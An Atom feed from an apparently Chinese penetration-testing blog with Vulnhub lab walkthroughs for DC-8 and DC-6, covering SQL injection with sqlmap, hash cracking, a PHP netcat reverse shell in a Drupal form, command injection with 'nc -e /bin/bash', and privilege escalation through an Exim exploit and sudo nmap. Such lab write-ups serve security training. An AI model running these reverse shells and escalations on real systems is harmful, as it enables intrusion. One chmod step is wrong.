<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>知识加油站</title>
  
  <subtitle>渗透小知识</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-06-15T06:02:36.992Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>深山法海</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Vulnhub系列-DC8靶场</title>
    <link href="http://example.com/2023/06/13/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/"/>
    <id>http://example.com/2023/06/13/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/</id>
    <published>2023-06-13T04:46:07.000Z</published>
    <updated>2023-06-15T06:02:36.992Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、前期准备"><a href="#一、前期准备" class="headerlink" title="一、前期准备"></a>一、前期准备</h3><h4 id="1-下载地址"><a href="#1-下载地址" class="headerlink" title="1.下载地址"></a>1.下载地址</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.five86.com/downloads/DC-8.zip</span><br></pre></td></tr></table></figure><h4 id="2-利用工具"><a href="#2-利用工具" class="headerlink" title="2.利用工具"></a>2.利用工具</h4><p><strong>注意：</strong>网络设置需要修改哦</p><p>kali 桥接模式</p><p>DC-8 桥接模式</p><span id="more"></span><h3 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h3><h4 id="1-主机扫描"><a href="#1-主机扫描" class="headerlink" title="1.主机扫描"></a>1.主机扫描</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613125957327.png" alt="image-20230613125957327"></p><p>发现目标靶机的IP地址</p><blockquote><p>kali192.168.1.9</p><p>dc8192.168.1.14</p></blockquote><h4 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h4><p>利用 <code>nmap</code> 扫描目标靶机IP开放的端口服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p 1-65535 192.168.1.14</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613130212384.png" alt="image-20230613130212384"></p><h4 id="3-目录扫描"><a href="#3-目录扫描" class="headerlink" title="3.目录扫描"></a>3.目录扫描</h4><p>利用 <code>dirsearch</code> 扫描网站后台目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://192.168.1.14/</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613131237851.png" alt="image-20230613131237851"></p><h4 id="4-页面探测"><a href="#4-页面探测" class="headerlink" title="4.页面探测"></a>4.页面探测</h4><p>利用浏览器插件收集网站使用的技术</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613131121722.png" alt="image-20230613131121722"></p><p>发现是Drupal 7</p><p>通过扫描到的目录进行查看</p><p>在 <code>/CHANGELOG.txt</code> 中，发现了一个貌似类似于日志的文件，还知道了 <code>Drupal 7.67</code> 版本</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613132353915.png" alt="image-20230613132353915"></p><p>Drupal 7.67在网上查询不到漏洞</p><p>经过探测，在主页，点击蓝色字体，地址栏出现 <code>?nid=1</code> 貌似存在注入点</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613135610243.png" alt="image-20230613135610243"></p><h3 id="三、渗透过程"><a href="#三、渗透过程" class="headerlink" title="三、渗透过程"></a>三、渗透过程</h3><h4 id="1-SQL注入"><a href="#1-SQL注入" class="headerlink" title="1.SQL注入"></a>1.SQL注入</h4><p>在nid参数后加单引号，测试一下是否为注入点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?nid=&#x27;</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613152518650.png" alt="image-20230613152518650"></p><p>发现sql报错，确定为注入点</p><p>利用SQLmap跑一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.14/?nid=1&quot; --level=5 --risk=3 --batch --current-db</span><br></pre></td></tr></table></figure><blockquote></blockquote><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613153016843.png" alt="image-20230613153016843"></p><p>发现数据库，库名为 <code>d7db</code> </p><p>爆表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.14/?nid=1&quot; --level=5 --risk=3 --batch -D &#x27;d7db&#x27; -tables</span><br></pre></td></tr></table></figure><p> 爆出了很多个表</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613153612379.png" alt="image-20230613153612379"></p><p>知道表名，继续爆列名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.14/?nid=1&quot; --level=5 --risk=3 --batch -D &#x27;d7db&#x27; -T -columns</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613153944821.png" alt="image-20230613153944821"></p><p>知道列名，我们开始爆字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.14/?nid=1&quot; --level=5 --risk=3 --batch -D &#x27;d7db&#x27; -T &#x27;users&#x27; -C&#x27;mail,name,pass&#x27; -dump</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613154433201.png" alt="image-20230613154433201"></p><h4 id="2-爆破密文"><a href="#2-爆破密文" class="headerlink" title="2.爆破密文"></a>2.爆破密文</h4><p>拿到账号密码，发现密码是经过加密的</p><p>将两个密码存储进 <code>passdc8.1.txt</code> 中，方便后面利用。</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613161115695.png" alt="image-20230613161115695"></p><p>通过查询，Drupal的hash密文是经过特殊加密的，用john进行爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john passdc8.1.txt</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613161216992.png" alt="image-20230613161216992"></p><p>发现爆出来一个 <code>turtle</code> ，利用账号密码登录。分不清爆出的密码是哪个用户的，最好还是一个一个爆，就知道是哪个了，我只能都试试了。</p><blockquote><p>账号：admin</p><p>密码：turtle</p><p>账号：john</p><p>密码：turtle</p></blockquote><p>在信息收集阶段，发现的登录页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/user/login</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613161548222.png" alt="image-20230613161548222"></p><h4 id="3-查找漏洞"><a href="#3-查找漏洞" class="headerlink" title="3.查找漏洞"></a>3.查找漏洞</h4><p>经过测试，密码是用户 <code>john</code>  ，登录页面如下</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613162133087.png" alt="image-20230613162133087"></p><p>经过测试发现联系我们处有问题</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613162859727.png" alt="image-20230613162859727"></p><h4 id="4-反弹shell"><a href="#4-反弹shell" class="headerlink" title="4.反弹shell"></a>4.反弹shell</h4><p>在文本框内输入php代码，反弹shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;nc -e /bin/bash 192.168.1.49 6666&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613163517122.png" alt="image-20230613163517122"></p><p>将提交重定向行Confirmation page（确认页面）给勾上，然后滑到底部点保存</p><p>退出后，联系方式什么的随便填写，完成后点击提交</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613164032820.png" alt="image-20230613164032820"></p><p>提交后。PHP代码执行，反弹shell成功</p><p>为了方遍，进入交互式shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613163828610.png" alt="image-20230613163828610"></p><h4 id="5-提权阶段"><a href="#5-提权阶段" class="headerlink" title="5.提权阶段"></a>5.提权阶段</h4><p>查找提权方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613164533519.png" alt="image-20230613164533519"></p><p>发现<code>exim 4</code></p><p>我们在dc4已经见过这个提权方式了</p><p>老规矩，先查看一下版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exim --version</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613164812675.png" alt="image-20230613164812675"></p><p>exim 4.89</p><p>接着查找一下漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit exim 4</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613165317992.png" alt="image-20230613165317992"></p><p>复制一下文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/local/46996.sh dc8.sh  </span><br></pre></td></tr></table></figure><p>开启http服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 8888</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613170208718.png" alt="image-20230613170208718"></p><p>在靶机shell中提取文件</p><p>应该先进入 <code>/tmp</code> 目录下，因为这个目录权限大一些</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget 192.168.1.49:8888/dc8.sh</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613170657981.png" alt="image-20230613170657981"></p><p>查看一下文件权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613170755327.png" alt="image-20230613170755327"></p><p>可以看到文件不可执行的，我们可以用chmod命令赋予执行权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod -x dc8.sh</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613171046570.png" alt="image-20230613171046570"></p><p>输入命令，执行文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./dc8.sh -m netcat</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613171933247.png" alt="image-20230613171933247"></p><p>提权成功，root权限维持时间很短，所以搞事情的速度要快哦</p><h4 id="6-查找flag"><a href="#6-查找flag" class="headerlink" title="6.查找flag"></a>6.查找flag</h4><p>在root下发现flag文件</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC8%E9%9D%B6%E5%9C%BA/image-20230613172120698.png" alt="image-20230613172120698"></p><p>本文参考链接：<a href="https://blog.csdn.net/l2872253606/article/details/126062437">(67条消息) DC-8靶场下载及渗透实战详细过程（DC靶场系列）_dc靶场下载_金 帛的博客-CSDN博客</a></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;一、前期准备&quot;&gt;&lt;a href=&quot;#一、前期准备&quot; class=&quot;headerlink&quot; title=&quot;一、前期准备&quot;&gt;&lt;/a&gt;一、前期准备&lt;/h3&gt;&lt;h4 id=&quot;1-下载地址&quot;&gt;&lt;a href=&quot;#1-下载地址&quot; class=&quot;headerlink&quot; title=&quot;1.下载地址&quot;&gt;&lt;/a&gt;1.下载地址&lt;/h4&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;https://www.five86.com/downloads/DC-8.zip&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h4 id=&quot;2-利用工具&quot;&gt;&lt;a href=&quot;#2-利用工具&quot; class=&quot;headerlink&quot; title=&quot;2.利用工具&quot;&gt;&lt;/a&gt;2.利用工具&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;注意：&lt;/strong&gt;网络设置需要修改哦&lt;/p&gt;
&lt;p&gt;kali 桥接模式&lt;/p&gt;
&lt;p&gt;DC-8 桥接模式&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Vulnhub系列-DC7靶场</title>
    <link href="http://example.com/2023/06/13/Vulnhub%E7%B3%BB%E5%88%97-DC7%E9%9D%B6%E5%9C%BA/"/>
    <id>http://example.com/2023/06/13/Vulnhub%E7%B3%BB%E5%88%97-DC7%E9%9D%B6%E5%9C%BA/</id>
    <published>2023-06-13T04:46:02.000Z</published>
    <updated>2023-06-13T04:46:02.958Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>Vulnhub系列-DC6靶场</title>
    <link href="http://example.com/2023/06/13/Vulnhub%E7%B3%BB%E5%88%97-DC6%E9%9D%B6%E5%9C%BA/"/>
    <id>http://example.com/2023/06/13/Vulnhub%E7%B3%BB%E5%88%97-DC6%E9%9D%B6%E5%9C%BA/</id>
    <published>2023-06-13T04:45:57.000Z</published>
    <updated>2023-06-16T09:29:51.171Z</updated>
    
    <content type="html"><![CDATA[<p>概要</p><span id="more"></span><h3 id="一、前期准备"><a href="#一、前期准备" class="headerlink" title="一、前期准备"></a>一、前期准备</h3><h4 id="1-下载地址"><a href="#1-下载地址" class="headerlink" title="1.下载地址"></a>1.下载地址</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.vulnhub.com/entry/dc-6,315/</span><br></pre></td></tr></table></figure><h4 id="2-利用工具"><a href="#2-利用工具" class="headerlink" title="2.利用工具"></a>2.利用工具</h4><p>kali</p><p><strong>注意：</strong>网络设置需要修改哦</p><p>kali  桥接模式</p><p>DC-5 桥接模式</p><h3 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h3><h4 id="1-探测主机"><a href="#1-探测主机" class="headerlink" title="1.探测主机"></a>1.探测主机</h4><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC6%E9%9D%B6%E5%9C%BA/image-20230616102354252.png" alt="image-20230616102354252"></p><p>发现同一网段中的目标IP</p><blockquote><p>kali：192.168.1.49</p><p>dc6：192.168.1.237</p></blockquote><h4 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -A -p 1-65535 192.168.1.237</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC6%E9%9D%B6%E5%9C%BA/image-20230616102944158.png" alt="image-20230616102944158"></p><h4 id="3-目录扫描"><a href="#3-目录扫描" class="headerlink" title="3.目录扫描"></a>3.目录扫描</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u 192.168.1.237</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC6%E9%9D%B6%E5%9C%BA/image-20230616104524599.png" alt="image-20230616104524599"></p><h4 id="4-网站探测"><a href="#4-网站探测" class="headerlink" title="4.网站探测"></a>4.网站探测</h4><p>开启HTTP服务，输入ip无法连接服务器且IP变域名</p><p>直接访问<code>192.168.1.237</code> 会被重定向 <code>http://wordy</code></p><p>说明DNS服务器无法解析该域名</p><p>所以我们需要修改hosts文件内容，使域名wordy对应IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts#hosts文件地址，用vim打开</span><br><span class="line">192.168.1.237 wordy     #输入后保存即可发现浏览器可以通过访问IP连接服务器了</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC6%E9%9D%B6%E5%9C%BA/image-20230616104726195.png" alt="image-20230616104726195"></p><p>4.网站探测</p><p>修改完hosts文件内容，可以在kali内置浏览器看到网站</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC6%E9%9D%B6%E5%9C%BA/image-20230616115720805.png" alt="image-20230616115720805"></p><h3 id="三、漏洞利用"><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h3><p>利用浏览器插件可以看到网站使用的技术，是通过WordPress搭建的。</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC6%E9%9D%B6%E5%9C%BA/image-20230616115840481.png" alt="image-20230616115840481"></p><p>发现是wordpress，用dirb扫描一下目录，查看wordpress的目录结构，找到后台地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb 192.168.1.237</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC6%E9%9D%B6%E5%9C%BA/image-20230616141456198.png" alt="image-20230616141456198"></p><p>找到后台登录界面，后台仍是默认地址</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC6%E9%9D%B6%E5%9C%BA/image-20230616140753001.png" alt="image-20230616140753001"></p><h4 id="1-枚举用户"><a href="#1-枚举用户" class="headerlink" title="1.枚举用户"></a>1.枚举用户</h4><p>我们可以使用wpscan扫描一下获取wordpress的版本信息和枚举用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url  http://wordy -e u       #枚举用户</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC6%E9%9D%B6%E5%9C%BA/image-20230616142224813.png" alt="image-20230616142224813"></p><p>成功获得五个用户，将他们放在<code>user.txt</code>文件里</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC6%E9%9D%B6%E5%9C%BA/image-20230616153602122.png" alt="image-20230616153602122"></p><h4 id="2-爆破密码"><a href="#2-爆破密码" class="headerlink" title="2.爆破密码"></a>2.爆破密码</h4><p>使用cewl对网站敏感单词进行爬行，将单词都放进<code>pass.txt</code> 中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://wordy/ -w pass.txt</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC6%E9%9D%B6%E5%9C%BA/image-20230616153933119.png" alt="image-20230616153933119"></p><p>利用wpscan进行暴力破解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://wordy/ -U user.txt -P pass.txt </span><br></pre></td></tr></table></figure><p>发现不行，看了大佬博客，据说在靶机地址处就提示需要用字典进行爆破</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC6%E9%9D%B6%E5%9C%BA/image-20230616161632608.png" alt="image-20230616161632608"></p><p>进入到&#x2F;usr&#x2F;share&#x2F;wordlists，查看当前目录，发现这个字典是需要解压的</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC6%E9%9D%B6%E5%9C%BA/image-20230616161745323.png" alt="image-20230616161745323"></p><p>将字典复制到某一个文件夹下并解压</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/wordlists/rockyou.txt.gz 目标文件夹路径/目标文件夹</span><br></pre></td></tr></table></figure><p>将其进行解压</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip rockyou.txt.gz rockyou.txt</span><br></pre></td></tr></table></figure><p>得到rockyou.txt，这是一个密码本</p><p>然后将里面的k01的部分导出到dc6目录下面的passwords.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat rockyou.txt | grep k01 &gt; 路径/password.txt</span><br></pre></td></tr></table></figure><p>再利用wpscan进行暴力破解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://wordy/ -U user.txt -P password.txt </span><br></pre></td></tr></table></figure><p>成功得到一个账号密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username：mark</span><br><span class="line">Password：helpdesk01</span><br></pre></td></tr></table></figure><h4 id="3-后台探测"><a href="#3-后台探测" class="headerlink" title="3.后台探测"></a>3.后台探测</h4><p>使用这个账号密码登入后台，进行探测</p><p>发现在Activity monitor这个插件中，有一个Tools模块，里面有一个命令执行输入框</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC6%E9%9D%B6%E5%9C%BA/image-20230616165633535.png" alt="image-20230616165633535"></p><h4 id="4-反弹shell"><a href="#4-反弹shell" class="headerlink" title="4.反弹shell"></a>4.反弹shell</h4><p>尝试去利用 反弹shell</p><p>由于前端限制字数，我们按 <code>F12</code> 更改源码，将maxlength&#x3D;”15”中的数字改为50</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC6%E9%9D%B6%E5%9C%BA/image-20230616170139609.png" alt="image-20230616170139609"></p><p>在kali中监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure><p>在输入框内输入nc反弹shell命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.0.1||nc -e /bin/bash kali的IP 4444</span><br></pre></td></tr></table></figure><p>成功连接</p><p>输入python，进入交互式shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><h4 id="5-提权阶段"><a href="#5-提权阶段" class="headerlink" title="5.提权阶段"></a>5.提权阶段</h4><p>在mark目录下的子目录下存在一个txt文件，打开看看</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC6%E9%9D%B6%E5%9C%BA/image-20230616171635026.png" alt="image-20230616171635026"></p><blockquote><p>用户：graham</p><p>密码：GSo7isUM1D4</p></blockquote><p> 我们看到了graham用户的密码，可以使用ssh直接连接，也可以使用su来切换用户，为了方便我们直接在交互式shell里面来切换用户吧。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su graham</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC6%E9%9D%B6%E5%9C%BA/image-20230616171847165.png" alt="image-20230616171847165"></p><p>查看当前用户可执行操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC6%E9%9D%B6%E5%9C%BA/image-20230616172051751.png" alt="image-20230616172051751"></p><p>发现jens&#x2F;下面的backups.sh可以在当前用户下执行，那么切换到该目录下面去查看脚本内容</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC6%E9%9D%B6%E5%9C%BA/image-20230616172204696.png" alt="image-20230616172204696"></p><p> 是备份网站根目录的作用，那么既然可以执行脚本，那么我们在脚本里面写入&#x2F;bin&#x2F;bash 命令，然后让jens用户运行不就可以获取到jens的shell了吗，反正是在jens目录下的脚本。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;/bin/bash&quot; &gt;&gt; backups.sh</span><br><span class="line">sudo -u jens ./backups.sh</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC6%E9%9D%B6%E5%9C%BA/image-20230616172427924.png" alt="image-20230616172427924"></p><p>nmap脚本提权</p><p>获取到jens的shell，查看它有哪些执行操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC6%E9%9D%B6%E5%9C%BA/image-20230616172539606.png" alt="image-20230616172539606"></p><p> 发现可以执行root的nmap，也就是nmap是root权限</p><p>nmap工具是可以执行脚本的，那么我们把弹root用户shell的命令写入到nmap的脚本里面，然后用nmap命令执行即可切换到root用户的shell。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;os.execute(&quot;/bin/sh&quot;)&#x27; &gt; getShell</span><br><span class="line">sudo  nmap  --script=getShell</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC6%E9%9D%B6%E5%9C%BA/image-20230616172738296.png" alt="image-20230616172738296"></p><p>提权成功</p><p>查看flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name *flag*</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC6%E9%9D%B6%E5%9C%BA/image-20230616172828247.png" alt="image-20230616172828247"></p><p>查看这个文件</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC6%E9%9D%B6%E5%9C%BA/image-20230616172943801.png" alt="image-20230616172943801"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;概要&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Vulnhub系列-DC5靶场</title>
